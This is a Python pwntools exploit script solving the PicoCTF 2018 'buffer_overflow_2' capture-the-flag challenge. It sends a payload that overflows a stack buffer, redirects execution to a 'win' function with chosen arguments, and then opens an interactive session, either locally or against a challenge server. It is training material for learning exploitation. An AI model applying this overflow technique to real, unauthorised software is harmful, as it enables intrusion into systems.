#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./PicoCTF_2018_buffer_overflow_2')
	#elf = ELF('./PicoCTF_2018_buffer_overflow_2',checksec=False)

else:
	p = remote('node3.buuoj.cn',27417)
	#elf = ELF('./PicoCTF_2018_buffer_overflow_2',checksec=False)


win = 0x80485CB
pop2ret = 0x0804872a
offset = 0x6C

payload = 'A' * offset + 'dead' + p32(win) + p32(pop2ret) +p32(0xDEADBEEF) + p32(0xDEADC0DE)
sla("Please enter your string: \n",payload)

ia()